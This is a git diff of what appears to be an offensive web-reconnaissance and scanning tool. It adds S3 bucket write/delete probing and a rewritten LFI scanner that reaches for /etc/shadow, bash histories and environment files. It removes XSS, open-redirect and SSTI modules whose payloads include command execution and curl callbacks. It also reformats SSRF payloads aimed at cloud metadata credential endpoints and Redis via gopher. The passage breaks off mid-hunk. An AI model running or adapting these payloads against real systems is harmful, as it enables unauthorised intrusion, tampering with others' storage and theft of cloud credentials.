@@ -11,6 +11,7 @@ import boto3
 from botocore.exceptions import ClientError
 from tqdm import tqdm
 import dns.resolver
+import yaml
 
 # Import the logger
 logger = logging.getLogger("Falcon")
@@ -415,7 +416,9 @@ class BucketFinder:
         try:
             self.s3_client = boto3.client("s3")
             self.boto3_available = True
-            logger.info(f"{color.GREEN}boto3 client initialised successfully{color.END}")
+            logger.info(
+                f"{color.GREEN}boto3 client initialised successfully{color.END}"
+            )
         except Exception as e:
             self.boto3_available = False
             logger.warning(f"{color.RED}boto3 initialisation failed: {e}{color.END}")
@@ -428,15 +431,21 @@ class BucketFinder:
 
             logger.info(f"{color.SKY_BLUE}Reading CNAMEs from {cnames_file}{color.END}")
 
-            with open(cnames_file, "r") as infile, open(aws_cnames_output, "w") as outfile:
+            with open(cnames_file, "r") as infile, open(
+                aws_cnames_output, "w"
+            ) as outfile:
                 for line in infile:
                     parts = line.strip().split()
                     if len(parts) >= 3 and "s3" in parts[2] and "amazonaws" in parts[2]:
                         bucket = parts[2].strip(".")
                         outfile.write(bucket + "\n")
-                        logger.debug(f"{color.BLUE}Found AWS CNAME: {bucket}{color.END}")
+                        logger.debug(
+                            f"{color.BLUE}Found AWS CNAME: {bucket}{color.END}"
+                        )
 
-            logger.info(f"{color.SKY_BLUE}Starting to test bucket permissions...{color.END}")
+            logger.info(
+                f"{color.SKY_BLUE}Starting to test bucket permissions...{color.END}"
+            )
             self.test_bucket_permissions(aws_cnames_output)
 
         except Exception as e:
@@ -448,7 +457,9 @@ class BucketFinder:
             vuln_txt_path = f"{self.output_file}/vuln/aws_vuln_buckets.txt"
             json_output_path = f"{self.output_file}/vuln/s3-buckets.json"
 
-            logger.info(f"{color.SKY_BLUE}Testing bucket permissions listed in {aws_cnames_file}{color.END}")
+            logger.info(
+                f"{color.SKY_BLUE}Testing bucket permissions listed in {aws_cnames_file}{color.END}"
+            )
 
             with open(aws_cnames_file, "r") as f, open(vuln_txt_path, "w") as vuln_file:
                 for line in f:
@@ -457,7 +468,9 @@ class BucketFinder:
                         continue
 
                     bucket_name = bucket_url.split(".")[0]
-                    logger.debug(f"{color.BLUE}Testing bucket: {bucket_name}{color.END}")
+                    logger.debug(
+                        f"{color.BLUE}Testing bucket: {bucket_name}{color.END}"
+                    )
 
                     result = self.test_single_bucket(bucket_name, bucket_url)
 
@@ -474,10 +487,14 @@ class BucketFinder:
 
             with open(json_output_path, "w") as json_file:
                 json.dump(self.vulnerable_buckets, json_file, indent=2)
-                logger.info(f"{color.GREEN}Saved JSON results to {json_output_path}{color.END}")
+                logger.info(
+                    f"{color.GREEN}Saved JSON results to {json_output_path}{color.END}"
+                )
 
         except Exception as e:
-            logger.exception(f"{color.RED}Error testing bucket permissions: {e}{color.END}")
+            logger.exception(
+                f"{color.RED}Error testing bucket permissions: {e}{color.END}"
+            )
 
     def test_single_bucket(self, bucket_name, bucket_url):
         """Test permissions for a single bucket"""
@@ -513,7 +530,9 @@ class BucketFinder:
                 except requests.RequestException:
                     pass
         except requests.RequestException as e:
-            logger.debug(f"{color.RED}HTTP PUT/DELETE failed for {bucket_name}: {e}{color.END}")
+            logger.debug(
+                f"{color.RED}HTTP PUT/DELETE failed for {bucket_name}: {e}{color.END}"
+            )
 
         # boto3 checks if available
         if self.boto3_available:
@@ -521,7 +540,9 @@ class BucketFinder:
                 self.s3_client.list_objects_v2(Bucket=bucket_name, MaxKeys=1)
                 permissions["listable"] = True
             except ClientError as e:
-                logger.debug(f"{color.RED}boto3 list_objects_v2 failed for {bucket_name}: {e}{color.END}")
+                logger.debug(
+                    f"{color.RED}boto3 list_objects_v2 failed for {bucket_name}: {e}{color.END}"
+                )
 
             try:
                 test_key = f"boto3_test_{bucket_name}.txt"
@@ -531,9 +552,13 @@ class BucketFinder:
                     self.s3_client.delete_object(Bucket=bucket_name, Key=test_key)
                     permissions["deletable"] = True
                 except ClientError as e:
-                    logger.debug(f"{color.RED}boto3 delete_object failed for {bucket_name}: {e}{color.END}")
+                    logger.debug(
+                        f"{color.RED}boto3 delete_object failed for {bucket_name}: {e}{color.END}"
+                    )
             except ClientError as e:
-                logger.debug(f"{color.RED}boto3 put_object failed for {bucket_name}: {e}{color.END}")
+                logger.debug(
+                    f"{color.RED}boto3 put_object failed for {bucket_name}: {e}{color.END}"
+                )
 
         return {
             "bucket_name": bucket_name,
@@ -542,7 +567,6 @@ class BucketFinder:
             "vulnerable": any(permissions.values()),
             "tested_with": "boto3+http" if self.boto3_available else "http-only",
         }
-
 
 
 class UrlFinder:
@@ -644,7 +668,7 @@ class UrlFinder:
                             f"{color.RED}[-] Failed to download: {url} (Status {response.status_code}){color.END}"
                         )
                 except requests.exceptions.RequestException as e:
-                    logger.error(
+                    logger.exception(
                         f"{color.RED}[-] Error downloading {url}: {e}{color.END}"
                     )
             # If no files were downloaded, skip Semgrep
@@ -686,9 +710,7 @@ class UrlFinder:
             logger.exception(f"{color.RED}Error occurred: {e}{color.END}")
 
 
-class XSS:
-    """Class to test for Cross-Site Scripting (XSS) vulnerabilities"""
-
+class LFI:
     def __init__(self, domains, output_file):
         """
         Initialize with domains file and output directory
@@ -699,322 +721,150 @@ class XSS:
         """
         self.domains = domains
         self.output_file = output_file
-
-    def xss_cli(self):
-        """Test for XSS vulnerabilities using common payloads"""
-        try:
-            xss_urls = f"{self.output_file}/urls/gf-xss.txt"
-            xss_output = f"{self.output_file}/vuln/xss_output.txt"
-            xss_payloads = [
-                '"><svg/onload=alert(1337)>',
-                '"><img src=x onerror=alert()>',
-                '"><script>alert()</script>',
-            ]
-            for xss_test in xss_payloads:
-                logger.info(
-                    f"{color.GREEN}(+) Testing for xss via CLI{color.END}\n{color.SKY_BLUE}(+) Testing payload: {xss_test}{color.END}"
-                )
-                subprocess.run(
-                    f"cat {xss_urls} | qsreplace '{xss_test}' | freq | grep -iv 'Not Vulnerable' | tee -a {xss_output}",
-                    shell=True,
-                    check=True,
-                )
-        except Exception as e:
-            logger.exception(f"{color.RED}Error occurred: {e}{color.END}")
-
-class OpenRedirect:
-    """Class to test for Open Redirect vulnerabilities using OpenRedireX"""
-
-    def __init__(self, domains, output_file):
-        """
-        Initialize with domains file and output directory
-        
-        Args:
-            domains (str): Path to file containing target domains
-            output_file (str): Path to output directory
-        """
-        self.domains = domains
-        self.output_file = output_file
-
-    def openredirex(self):
-        """Test for Open Redirect vulnerabilities in two phases"""
-        try:
-            # Phase 1: Scan domains directly
-            domains_output = f"{self.output_file}/open_redirect_domains.txt"
-            phase1_cmd = (
-                f'cat {self.domains} | openredirex -c 50 | anew {domains_output}'
-            )
-            subprocess.run(phase1_cmd, shell=True, check=True)
-            logger.info(f"{color.GREEN}(+) Phase 1 complete: Domain scan results saved to {domains_output}{color.END}")
-
-            # Phase 2: Scan all URLs
-            urls = f"{self.output_file}/urls/all-urls.txt"
-            urls_output = f"{self.output_file}/vuln/open-redirect.txt"
-            
-            # Create vuln directory if it doesn't exist
-            os.makedirs(os.path.dirname(urls_output), exist_ok=True)
-            
-            phase2_cmd = (
-                f'cat {urls} | openredirex -c 50 | anew {urls_output}'
-            )
-            subprocess.run(phase2_cmd, shell=True, check=True)
-            logger.info(f"{color.GREEN}(+) Phase 2 complete: URL scan results saved to {urls_output}{color.END}")
-
-        except subprocess.CalledProcessError as e:
-            logger.error(f"{color.RED}(!) Command failed with exit code {e.returncode}{color.END}")
-        except Exception as e:
-            logger.exception(f"{color.RED}(+) Unexpected error occurred: {e}{color.END}")
 
 
 class LFI:
-    """Class to test for Local File Inclusion vulnerabilities"""
-
     def __init__(self, domains, output_file):
-        """
-        Initialize with domains file and output directory
-
-        Args:
-            domains (str): Path to file containing target domains
-            output_file (str): Path to output directory
-        """
         self.domains = domains
         self.output_file = output_file
+        self.session = requests.Session()
+        self.session.headers = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0"
+        }
+        self.tested_urls = set()
 
-    def lfi_cli(self):
-        """Test for LFI vulnerabilities using common payloads"""
+    def _generate_payloads(self):
+        base_files = [
+            "/etc/passwd",
+            "/etc/shadow",
+            "/proc/self/environ",
+            "/var/log/apache2/access.log",
+            "/var/log/nginx/access.log",
+            "/var/www/html/config.php",
+            "/root/.bash_history",
+            "/home/*/.bash_history",
+            "C:\\Windows\\win.ini",
+            "C:\\Windows\\System32\\drivers\\etc\\hosts",
+        ]
+        traversal_patterns = [
+            "../" * 8,
+            "..%2f" * 8,
+            "..%252f" * 8,
+            "..%c0%af" * 8,
+            "..\\" * 8,
+            "%2e%2e/" * 8,
+            "....//" * 8,
+        ]
+        null_bytes = ["", "%00", "%2500", ".jpg"]
+        payloads = []
+        for file in base_files:
+            for traversal in traversal_patterns:
+                for null in null_bytes:
+                    payloads.append(f"{traversal}{file}{null}")
+        return payloads
+
+    def _is_vulnerable(self, response):
+        indicators = {
+            "linux": ["root:x:0:0", "daemon:x:1:1", "bin:x:2:2"],
+            "windows": ["; for 16-bit app support", "[fonts]", "[extensions]"],
+            "apache": ["Apache access log", "GET / HTTP/1.1"],
+            "php": ["<?php", "PHP Version"],
+        }
+        content = response.text.lower()
+        for patterns in indicators.values():
+            for pattern in patterns:
+                if pattern.lower() in content:
+                    return True
+        return False
+
+    def deep_scan(self):
+        """Detailed LFI scanner with evidence output"""
+        try:
+            lfi_urls = f"{self.output_file}/urls/gf-lfi.txt"
+            output_file = f"{self.output_file}/vuln/confirmed_lfi.json"
+            if not os.path.exists(lfi_urls):
+                logger.error(f"LFI URLs file not found: {lfi_urls}")
+                return False
+
+            payloads = self._generate_payloads()
+            results = []
+            with open(lfi_urls, "r") as f:
+                urls = [line.strip() for line in f if line.strip()]
+
+            for url in urls:
+                if url in self.tested_urls:
+                    continue
+                self.tested_urls.add(url)
+
+                for payload in payloads:
+                    if "=" in url:
+                        injected = url.replace("=param", f"={payload}")
+                        try:
+                            resp = self.session.get(injected, timeout=10)
+                            if self._is_vulnerable(resp):
+                                results.append(
+                                    {
+                                        "url": url,
+                                        "payload": payload,
+                                        "status": resp.status_code,
+                                        "evidence": resp.text[:200] + "...",
+                                    }
+                                )
+                        except Exception as e:
+                            logger.debug(f"Error testing {url}: {e}")
+
+            if results:
+                os.makedirs(os.path.dirname(output_file), exist_ok=True)
+                with open(output_file, "w") as f:
+                    json.dump(results, f, indent=2)
+                logger.info(
+                    f"{color.GREEN}[+] Found {len(results)} confirmed LFI vulnerabilities{color.END}"
+                )
+            else:
+                logger.info(f"{color.BLUE}[-] No LFI vulnerabilities found{color.END}")
+
+        except Exception as e:
+            logger.error(f"{color.RED}Deep scan failed: {e}{color.END}")
+
+    def fast_scan(self):
+        """Quick CLI-based scan using httpx + qsreplace"""
         lfi_payloads = [
             "../../../../etc/passwd",
             "../../../../../etc/passwd",
             "../../../../../etc/passwd%00",
-            "../../../../../etc/passwd%2500",
-            "../../../../../etc/passwd%00.jpg",
-            "..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
-            "..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd",
-            "..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
-            "..%255c..%255c..%255c..%255cetc%255cpasswd",
-            "%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd",
-            "../../../../../var/log/apache2/access.log",
-            "../../../../../var/log/nginx/access.log",
-            "../../../../../var/mail/root",
-            "../../../../../root/.bash_history",
-            "../../../../../home/user/.bash_history",
+            "..%2F..%2F..%2Fetc%2Fpasswd",
+            "..%252F..%252Fetc%252Fpasswd",
+            "..%c0%af..%c0%afetc%c0%afpasswd",
             "../../../../../proc/self/environ",
-            "../../../../../../../../../../../../../../etc/passwd",
-            "..%2F" * 10 + "etc%2Fpasswd",
-            "%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
-            "/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd",
-            "/..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
-            "/../../../../../../../../../../../etc/shadow",
-            "../../../../../../../../../../../../../dev/null",
-            "../../../../../../../../../../../../../boot.ini",
-            "../../../../../../../../../../../../../windows/system.ini",
-            "..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini",
-            "../../../../../../../../../../../../../etc/mysql/my.cnf",
-            "..%2F..%2F..%2F..%2F..%2Fvar%2Fspool%2Fmail%2Froot",
-            "%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fproc%2Fself%2Fenviron",
-            "%2F..%255c..%255c..%255c..%255cwindows%255csystem.ini",
-            "..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%2523",
-            "%2E%2E%5C%2E%2E%5C%2E%2E%5C%2E%2E%5Cwindows%5Cwin.ini",
+            "..%2F..%2F..%2Fwindows%2Fwin.ini",
         ]
-
         try:
-            urls = f"{self.output_file}/urls/gf-lfi.txt"
-            subdomains = f"{self.output_file}/hosts/alive-hosts.txt"
+            subs_file = f"{self.output_file}/hosts/alive-hosts.txt"
+            urls_file = f"{self.output_file}/urls/gf-lfi.txt"
+            output_subs = f"{self.output_file}/vuln/lfi-subs.txt"
             output_urls = f"{self.output_file}/vuln/lfi-urls.txt"
-            output_subdomains = f"{self.output_file}/vuln/lfi-subs.txt"
 
-            logger.info(f"{color.GREEN}(+) Testing subdomains for LFI...{color.END}")
+            os.makedirs(os.path.dirname(output_subs), exist_ok=True)
+
+            logger.info(
+                f"{color.GREEN}(+) Running fast subdomain LFI scan...{color.END}"
+            )
             for payload in lfi_payloads:
-                cmd_subs = f"cat {subdomains} | qsreplace '{payload}' | httpx -silent --random-agent -mc 200 -mr 'root:[x*]:0:0:' >> {output_subdomains}"
+                cmd_subs = f"cat {subs_file} | qsreplace '{payload}' | httpx -silent --random-agent -mc 200 -mr 'root:x:0:0:' >> {output_subs}"
                 subprocess.run(cmd_subs, shell=True)
 
-            logger.info(f"{color.GREEN}(+) Testing URLs for LFI...{color.END}")
+            logger.info(f"{color.GREEN}(+) Running fast URL LFI scan...{color.END}")
             for payload in lfi_payloads:
-                cmd_urls = f"cat {urls} | qsreplace '{payload}' | httpx -silent --random-agent -mc 200 -mr 'root:[x*]:0:0:' >> {output_urls}"
+                cmd_urls = f"cat {urls_file} | qsreplace '{payload}' | httpx -silent --random-agent -mc 200 -mr 'root:x:0:0:' >> {output_urls}"
                 subprocess.run(cmd_urls, shell=True)
 
         except Exception as e:
-            logger.exception(
-                f"{color.RED}(-) Error occurred during LFI scan: {e}{color.END}"
-            )
+            logger.error(f"{color.RED}Fast scan failed: {e}{color.END}")
 
-
-class SSTI:
-    """Class to test for Server-Side Template Injection vulnerabilities"""
-
-    def __init__(self, domains, output_file):
-        """
-        Initialize with domains file and output directory
-
-        Args:
-            domains (str): Path to file containing target domains
-            output_file (str): Path to output directory
-        """
-        self.domains = domains
-        self.output_file = output_file
-        self.payloads = self._load_payloads()
-        
-    def _load_payloads(self):
-        """Load SSTI payloads for different template engines"""
-        return {
-            'basic': [
-                '{{7*7}}',                   # Basic template test
-                '{{1337*2}}',                # Another arithmetic test
-                '{# comment #}',             # Comment test
-                '${7*7}',                    # Java-style
-                '#{7*7}',                    # Ruby-style
-                '<%= 7*7 %>',                # ERB-style
-                '${{7*7}}',                  # Spring EL
-                '@(7*7)',                    # Razor
-                '{{=7*7}}',                  # Mustache
-            ],
-            'jinja2': [
-                '{% for x in (1,2,3) %}{{x}}{% endfor %}',
-                '{{ config.items() }}',
-                '{{ self.__dict__ }}',
-                '{% print(1337*2) %}',
-            ],
-            'twig': [
-                '{{_self.env.registerUndefinedFilterCallback("exec")}}',
-                '{{_self.env.getFilter("id")}}',
-            ],
-            'django': [
-                '{% debug %}',
-                '{% include "file.txt" %}',
-                '{% load static %}{% static "file.txt" %}',
-            ],
-            'ruby': [
-                '<%= system("id") %>',
-                '<%= Dir.entries("/") %>',
-                '<%= File.open("/etc/passwd").read %>',
-            ],
-            'smarty': [
-                '{system("id")}',
-                '{php}echo `id`;{/php}',
-            ],
-            'velocity': [
-                '#set($exec=""){{$exec.class.forName("java.lang.Runtime").getRuntime().exec("id")}}',
-            ],
-            'freemarker': [
-                '<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }',
-            ]
-        }
-
-    def ssti_cli(self):
-        """Test for SSTI vulnerabilities using comprehensive payloads"""
-        try:
-            ssti_urls = f"{self.output_file}/urls/gf-ssti.txt"
-            ssti_output = f"{self.output_file}/vuln/ssti_output.txt"
-            
-            # Ensure output directory exists
-            os.makedirs(os.path.dirname(ssti_output), exist_ok=True)
-            
-            # Test each category of payloads
-            for engine, payloads in self.payloads.items():
-                logger.info(
-                    f"{color.GREEN}(+) Testing for {engine.upper()} SSTI{color.END}"
-                )
-                
-                for payload in payloads:
-                    logger.debug(
-                        f"{color.SKY_BLUE}(*) Testing payload: {payload}{color.END}"
-                    )
-                    
-                    # Use httpx for more reliable detection
-                    cmd = [
-                        'bash', '-c',
-                        f"cat {ssti_urls} | qsreplace '{payload}' | "
-                        f"httpx -silent -random-agent -timeout 5 -retries 2 -match-regex '49|2674|1337|root:' "
-                        f"-mr '49|2674|1337|root:' -json | jq -r '.url' | anew {ssti_output}"
-                    ]
-                    
-                    try:
-                        subprocess.run(
-                            cmd,
-                            check=True,
-                            timeout=30,
-                            stderr=subprocess.PIPE
-                        )
-                    except subprocess.TimeoutExpired:
-                        logger.warning(f"Timeout testing payload: {payload}")
-                    except subprocess.CalledProcessError as e:
-                        logger.debug(f"Error with payload {payload}: {e.stderr.decode().strip()}")
-            
-            # Additional check for blind SSTI using out-of-band detection
-            self._test_blind_ssti(ssti_urls, ssti_output)
-            
-            # Analyze results
-            self._analyze_results(ssti_output)
-            
-        except Exception as e:
-            logger.exception(f"{color.RED}Error in SSTI testing: {e}{color.END}")
-            return False
-        return True
-
-    def _test_blind_ssti(self, input_file, output_file):
-        """Test for blind SSTI using out-of-band techniques"""
-        try:
-            logger.info(f"{color.GREEN}(+) Testing for blind SSTI{color.END}")
-            
-            # Using interactsh for blind detection
-            blind_payloads = [
-                '{{request.application.__globals__.__builtins__.__import__("os").popen("curl %s").read()}}',
-                '{% for x in ().__class__.__base__.__subclasses__() %}{% if "Popen" in x.__name__ %}{{ x("curl %s", shell=True, stdout=-1).communicate()[0] }}{% endif %}{% endfor %}',
-                '<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("curl %s") }',
-            ]
-            
-            # Generate unique interactsh URL
-            interactsh_cmd = "interactsh-client -v -json 2>/dev/null | jq -r '.correlation_id' | head -1"
-            result = subprocess.run(interactsh_cmd, shell=True, capture_output=True, text=True)
-            if result.returncode != 0:
-                logger.warning("Failed to generate interactsh URL")
-                return
-                
-            interactsh_url = result.stdout.strip()
-            if not interactsh_url:
-                logger.warning("Empty interactsh URL")
-                return
-                
-            full_url = f"https://{interactsh_url}"
-            
-            for payload_template in blind_payloads:
-                payload = payload_template % full_url
-                cmd = [
-                    'bash', '-c',
-                    f"cat {input_file} | qsreplace '{payload}' | "
-                    f"httpx -silent -random-agent -timeout 10 -retries 1 | "
-                    f"anew {output_file}.blind"
-                ]
-                subprocess.run(cmd, check=True)
-                
-            logger.info(f"{color.GREEN}Monitor for interactions at: {full_url}{color.END}")
-            
-        except Exception as e:
-            logger.error(f"{color.RED}Error in blind SSTI testing: {e}{color.END}")
-
-    def _analyze_results(self, results_file):
-        """Analyze and summarize SSTI results"""
-        try:
-            if not os.path.exists(results_file):
-                logger.warning(f"No SSTI results found at {results_file}")
-                return
-                
-            with open(results_file, 'r') as f:
-                vuln_urls = f.read().splitlines()
-                
-            if not vuln_urls:
-                logger.info(f"{color.GREEN}No SSTI vulnerabilities found{color.END}")
-                return
-                
-            logger.info(f"{color.RED}[!] Found {len(vuln_urls)} potentially vulnerable URLs:{color.END}")
-            for url in vuln_urls[:10]:  # Show first 10 for brevity
-                logger.info(f"{color.RED}  - {url}{color.END}")
-                
-            if len(vuln_urls) > 10:
-                logger.info(f"{color.RED}  ... and {len(vuln_urls)-10} more{color.END}")
-                
-        except Exception as e:
-            logger.error(f"{color.RED}Error analyzing results: {e}{color.END}")
+    def run_all(self):
+        """Run both deep and fast LFI scans"""
+        self.fast_scan()
+        self.deep_scan()
 
 
 class SSRF:
@@ -1032,77 +882,76 @@ class SSRF:
         self.output_file = output_file
         self.payloads = self._generate_ssrf_payloads()
         self.interactsh_url = self._get_interactsh_url()
-        
+
     def _generate_ssrf_payloads(self):
         """Generate comprehensive SSRF test payloads"""
         base_payloads = [
             # Basic SSRF payloads
-            'http://169.254.169.254/latest/meta-data/',
-            'http://localhost/admin',
-            'http://127.0.0.1:8080',
-            'http://[::1]/',
-            
+            "http://169.254.169.254/latest/meta-data/",
+            "http://localhost/admin",
+            "http://127.0.0.1:8080",
+            "http://[::1]/",
             # Cloud metadata endpoints
-            'http://169.254.169.254/latest/user-data',
-            'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
-            'http://metadata.google.internal/computeMetadata/v1beta1/',
-            'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
-            'http://metadata.azure.internal/metadata/instance?api-version=2020-06-01',
-            
+            "http://169.254.169.254/latest/user-data",
+            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+            "http://metadata.google.internal/computeMetadata/v1beta1/",
+            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+            "http://metadata.azure.internal/metadata/instance?api-version=2020-06-01",
             # DNS rebinding payloads
-            'http://example.com@127.0.0.1',
-            'http://127.0.0.1#@example.com',
-            'http://127.0.0.1:80+&@example.com#+@127.0.0.1/',
-            
+            "http://example.com@127.0.0.1",
+            "http://127.0.0.1#@example.com",
+            "http://127.0.0.1:80+&@example.com#+@127.0.0.1/",
             # URL encoded payloads
-            'http://%6c%6f%63%61%6c%68%6f%73%74',
-            'http://%4c%6f%63%61%6c%68%6f%73%74',
-            
+            "http://%6c%6f%63%61%6c%68%6f%73%74",
+            "http://%4c%6f%63%61%6c%68%6f%73%74",
             # IPv6 payloads
-            'http://[::]',
-            'http://[::ffff:127.0.0.1]',
-            
+            "http://[::]",
+            "http://[::ffff:127.0.0.1]",
             # Protocol smuggling
-            'dict://localhost:6379/info',
-            'gopher://localhost:6379/_INFO',
-            'ftp://localhost:21',
-            'ldap://localhost',
-            'tftp://localhost',
-            
+            "dict://localhost:6379/info",
+            "gopher://localhost:6379/_INFO",
+            "ftp://localhost:21",
+            "ldap://localhost",
+            "tftp://localhost",
             # DNS payloads
-            'http://localtest.me',
-            'http://subdomain.localhost',
-            'http://customer1.app.localhost.127.0.0.1.nip.io',
-            
+            "http://localtest.me",
+            "http://subdomain.localhost",
+            "http://customer1.app.localhost.127.0.0.1.nip.io",
             # Out-of-band payloads
-            'http://{interactsh_url}',
-            'http://{interactsh_url}/?test=ssrf',
-            'http://{interactsh_url}/ssrf',
-            'http://{interactsh_url}/ping'
+            "http://{interactsh_url}",
+            "http://{interactsh_url}/?test=ssrf",
+            "http://{interactsh_url}/ssrf",
+            "http://{interactsh_url}/ping",
         ]
-        
+
         # Add interactsh URL if available
-        if hasattr(self, 'interactsh_url') and self.interactsh_url:
+        if hasattr(self, "interactsh_url") and self.interactsh_url:
             return [p.format(interactsh_url=self.interactsh_url) for p in base_payloads]
         return base_payloads
 
     def _get_interactsh_url(self):
         """Generate an interactsh URL for blind SSRF detection"""
         try:
-            logger.info(f"{color.GREEN}[+] Generating interactsh URL for blind SSRF detection{color.END}")
+            logger.info(
+                f"{color.GREEN}[+] Generating interactsh URL for blind SSRF detection{color.END}"
+            )
             result = subprocess.run(
                 "interactsh-client -v -json 2>/dev/null | jq -r '.correlation_id' | head -1",
                 shell=True,
                 capture_output=True,
                 text=True,
-                timeout=10
+                timeout=40,
             )
             if result.returncode == 0 and result.stdout.strip():
                 url = result.stdout.strip()
-                logger.info(f"{color.GREEN}[+] Monitoring for interactions at: https://{url}{color.END}")
+                logger.info(
+                    f"{color.GREEN}[+] Monitoring for interactions at: https://{url}{color.END}"
+                )
                 return url
         except Exception as e:
-            logger.error(f"{color.RED}[-] Failed to generate interactsh URL: {e}{color.END}")
+            logger.error(
+                f"{color.RED}[-] Failed to generate interactsh URL: {e}{color.END}"
+            )
         return None
 
     def ssrf_cli(self):
@@ -1112,33 +961,34 @@ class SSRF:
             ssrf_urls = f"{self.output_file}/urls/gf-ssrf.txt"
             ssrf_output = f"{self.output_file}/vuln/ssrf.txt"
             os.makedirs(os.path.dirname(ssrf_output), exist_ok=True)
-            
+
             # Phase 1: Basic SSRF testing
             logger.info(f"{color.GREEN}[+] Starting basic SSRF tests{color.END}")
             for payload in self.payloads:
-                if '{interactsh_url}' in payload and not self.interactsh_url:
+                if "{interactsh_url}" in payload and not self.interactsh_url:
                     continue
-                    
+
                 logger.debug(f"{color.BLUE}[*] Testing payload: {payload}{color.END}")
-                
+
                 # Use httpx for better detection
                 cmd = [
-                    'bash', '-c',
+                    "bash",
+                    "-c",
                     f"cat {ssrf_urls} | qsreplace '{payload}' | "
                     f"httpx -silent -random-agent -timeout 10 -retries 1 -match-string 'metadata' "
                     f"-mr 'metadata|localhost|127.0.0.1|Internal Server Error' "
-                    f"-json | jq -r '.url' | anew {ssrf_output}"
+                    f"-json | jq -r '.url' | anew {ssrf_output}",
                 ]
                 subprocess.run(cmd, check=False)
 
             # Phase 2: Advanced testing with custom tools
             self._advanced_ssrf_tests(ssrf_urls, ssrf_output)
-            
+
             # Phase 3: Analyze results
             self._analyze_ssrf_results(ssrf_output)
-            
+
             return True
-            
+
         except Exception as e:
             logger.exception(f"{color.RED}[-] SSRF test failed: {e}{color.END}")
             return False
@@ -1147,31 +997,35 @@ class SSRF:
         """Perform advanced SSRF testing with specialized tools"""
         try:
             logger.info(f"{color.GREEN}[+] Starting advanced SSRF tests{color.END}")
-            
+
             # Test with Gopherus for protocol smuggling
-            if self._check_tool_installed('gopherus'):
-                logger.info(f"{color.GREEN}[+] Running Gopherus for protocol smuggling{color.END}")
-                cmd = f"cat {input_file} | qsreplace 'gopher://localhost:6379/_' | " \
-                      f"xargs -I % -P 10 sh -c 'curl -ksm 5 \"%\" | grep \"redis\" && echo \"VULN: %\"' | " \
-                      f"anew {output_file}"
+            if self._check_tool_installed("gopherus"):
+                logger.info(
+                    f"{color.GREEN}[+] Running Gopherus for protocol smuggling{color.END}"
+                )
+                cmd = (
+                    f"cat {input_file} | qsreplace 'gopher://localhost:6379/_' | "
+                    f'xargs -I % -P 10 sh -c \'curl -ksm 5 "%" | grep "redis" && echo "VULN: %"\' | '
+                    f"anew {output_file}"
+                )
                 subprocess.run(cmd, shell=True, check=False)
-            
+
             # Test with DNS rebinding
             logger.info(f"{color.GREEN}[+] Testing DNS rebinding vectors{color.END}")
             dns_payloads = [
-                'http://example.com@127.0.0.1',
-                'http://127.0.0.1#@example.com',
-                'http://{interactsh_url}'
+                "http://example.com@127.0.0.1",
+                "http://127.0.0.1#@example.com",
+                "http://{interactsh_url}",
             ]
             for payload in dns_payloads:
-                if '{interactsh_url}' in payload and not self.interactsh_url:
+                if "{interactsh_url}" in payload and not self.interactsh_url:
                     continue
                 cmd = f"cat {input_file} | qsreplace '{payload}' | httpx -silent -random-agent | anew {output_file}"
                 subprocess.run(cmd, shell=True, check=False)
-            
+
             # Cloud metadata specific tests
             self._test_cloud_metadata(input_file, output_file)
-            
+
         except Exception as e:
             logger.error(f"{color.RED}[-] Advanced SSRF tests failed: {e}{color.END}")
 
@@ -1179,21 +1033,23 @@ class SSRF:
         """Specialized tests for cloud metadata endpoints"""
         try:
             logger.info(f"{color.GREEN}[+] Testing cloud metadata endpoints{color.END}")
-            
+
             cloud_payloads = [
-                'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
-                'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
-                'http://metadata.azure.internal/metadata/instance?api-version=2020-06-01',
-                'http://metadata.cloud.aliyuncs.com/latest/meta-data/',
-                'http://100.100.100.200/latest/meta-data/'
+                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+                "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+                "http://metadata.azure.internal/metadata/instance?api-version=2020-06-01",
+                "http://metadata.cloud.aliyuncs.com/latest/meta-data/",
+                "http://100.100.100.200/latest/meta-data/",
             ]
-            
+
             for payload in cloud_payloads:
-                cmd = f"cat {input_file} | qsreplace '{payload}' | " \
-                      f"httpx -silent -random-agent -match-string 'iam|token|metadata' " \
-                      f"-mr 'iam|token|metadata' -json | jq -r '.url' | anew {output_file}"
+                cmd = (
+                    f"cat {input_file} | qsreplace '{payload}' | "
+                    f"httpx -silent -random-agent -match-string 'iam|token|metadata' "
+                    f"-mr 'iam|token|metadata' -json | jq -r '.url' | anew {output_file}"
+                )
                 subprocess.run(cmd, shell=True, check=False)
-                
+
         except Exception as e:
             logger.error(f"{color.RED}[-] Cloud metadata tests failed: {e}{color.END}")
 
@@ -1203,44 +1059,68 @@ class SSRF:
             if not os.path.exists(results_file):
                 logger.warning(f"{color.SKY_BLUE}[!] No SSRF results found{color.END}")
                 return
-                
-            with open(results_file, 'r') as f:
+
+            with open(results_file, "r") as f:
                 vuln_urls = f.read().splitlines()
-                
+
             if not vuln_urls:
                 logger.info(f"{color.BLUE}[-] No SSRF vulnerabilities found{color.END}")
                 return
-                
+
             # Categorize findings
-            cloud_findings = [u for u in vuln_urls if '169.254.169.254' in u or 'metadata' in u]
-            localhost_findings = [u for u in vuln_urls if 'localhost' in u or '127.0.0.1' in u]
-            protocol_findings = [u for u in vuln_urls if any(p in u for p in ['dict://', 'gopher://', 'ftp://'])]
